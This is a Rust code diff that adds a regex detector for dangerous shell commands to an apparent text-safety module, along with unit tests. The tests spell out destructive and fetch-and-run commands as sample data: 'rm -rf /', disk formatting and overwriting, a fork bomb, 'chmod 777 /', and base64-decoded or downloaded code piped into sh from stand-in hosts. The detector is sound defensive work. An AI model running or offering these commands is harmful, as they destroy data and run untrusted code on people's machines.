@@ -310,6 +310,48 @@ pub fn mask(text: &str, whole: bool) -> String {
     out
 }
 
+// ---- dangerous commands -----------------------------------------------------------
+
+/// A few commands with (almost) no innocent use, and code run in a way that hides
+/// what it does. Ordinary `curl -fsSL https://… | sh` installers are not flagged.
+static DANGEROUS: LazyLock<Vec<(&'static str, Regex)>> = LazyLock::new(|| {
+    let sh = r"\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:ba|z|da|k)?sh\b";
+    [
+        ("Deletes everything in / or your home folder", r"(?m)\brm\s+(?:-\S+\s+)*(?:/\*?|~/?\*?|\$HOME/?\*?|\x22\$HOME\x22/?)(?:[\s;&|)]|$)"),
+        ("Formats a disk", r"\bmkfs(?:\.\w+)?\s+(?:-\S+\s+)*/dev/"),
+        ("Overwrites a disk", r"\bdd\b[^\n;&|]*\bof=/dev/(?:sd|nvme|hd|vd|xvd|mmcblk|disk)"),
+        ("Overwrites a disk", r">\s*/dev/(?:sd|nvme|hd|vd|xvd|mmcblk)[a-z0-9]*\b"),
+        ("Fork bomb (freezes the computer)", r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"),
+        ("Makes every file writable by anyone", r"\bchmod\s+(?:-\S+\s+)*(?:0?777|a\+rwx)\s+/(?:[\s;&|]|$)"),
+        ("Runs hidden (base64-encoded) code", &format!(r"\bbase64\s+(?:-\w*d\w*|--decode)\b[^\n]*{sh}")),
+        ("Runs downloaded code through eval", r#"\beval\s+["']?\$\(\s*(?:curl|wget)\b"#),
+        ("Runs code from a bare IP address", &format!(r"\b(?:curl|wget)\b[^\n|]*\bhttps?://\d{{1,3}}(?:\.\d{{1,3}}){{3}}\b[^\n|]*{sh}")),
+        ("Runs code downloaded without HTTPS", &format!(r"\b(?:curl|wget)\b[^\n|]*\bhttp://[^\n|]*{sh}")),
+    ]
+    .into_iter()
+    .map(|(label, re)| (label, Regex::new(re).expect("valid command pattern")))
+    .collect()
+});
+
+/// Why `text` looks like a dangerous command, if it does.
+pub fn dangerous_command(text: &str) -> Option<&'static str> {
+    let text = scan_window(text);
+    let found = DANGEROUS.iter().find(|(_, re)| re.is_match(text)).map(|(label, _)| *label)?;
+    // `rm` only counts when it deletes recursively.
+    if found.starts_with("Deletes") {
+        let re = &DANGEROUS[0].1;
+        let recursive = re.find_iter(text).any(|m| {
+            m.as_str().split_whitespace().skip(1).take_while(|w| w.starts_with('-')).any(|f| {
+                f == "--recursive" || (!f.starts_with("--") && (f.contains('r') || f.contains('R')))
+            })
+        });
+        if !recursive {
+            return DANGEROUS[1..].iter().find(|(_, re)| re.is_match(text)).map(|(label, _)| *label);
+        }
+    }
+    Some(found)
+}
+
 // ---- hidden characters ----------------------------------------------------------
 
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
@@ -766,6 +808,37 @@ mod tests {
         assert_eq!(clean(text), "echo saferm -rf ~");
         assert_eq!(describe(&found), "2 terminal escape sequences, 1 control character");
         assert_eq!(reveal("a\u{0}b"), "a⟨NUL⟩b");
+    }
+
+    #[test]
+    fn flags_only_clearly_dangerous_commands() {
+        for (cmd, label) in [
+            ("sudo rm -rf / --no-preserve-root", "Deletes everything"),
+            ("rm -fr ~", "Deletes everything"),
+            ("rm -r -f $HOME/*", "Deletes everything"),
+            ("mkfs.ext4 /dev/sda1", "Formats a disk"),
+            ("dd if=/dev/zero of=/dev/nvme0n1 bs=1M", "Overwrites a disk"),
+            (":(){ :|:& };:", "Fork bomb"),
+            ("chmod -R 777 /", "Makes every file"),
+            ("echo Y3VybCBldmls | base64 -d | bash", "Runs hidden"),
+            ("eval \"$(curl -s https://x.example/a)\"", "Runs downloaded code"),
+            ("curl -s http://203.0.113.7/x.sh | sudo sh", "Runs code from a bare IP"),
+            ("wget -qO- http://get.example.com/i.sh | sh", "Runs code downloaded without HTTPS"),
+        ] {
+            assert!(dangerous_command(cmd).is_some_and(|l| l.starts_with(label)), "{cmd}: {:?}", dangerous_command(cmd));
+        }
+        for cmd in [
+            "curl -fsSL https://sh.rustup.rs | sh",
+            "rm -rf ./build",
+            "rm ~/notes.txt",
+            "rm /tmp/x",
+            "dd if=disk.img of=backup.img",
+            "chmod 755 ./script.sh",
+            "base64 -d file.b64 > out.bin",
+            "echo hello",
+        ] {
+            assert_eq!(dangerous_command(cmd), None, "{cmd}");
+        }
     }
 
     #[test]
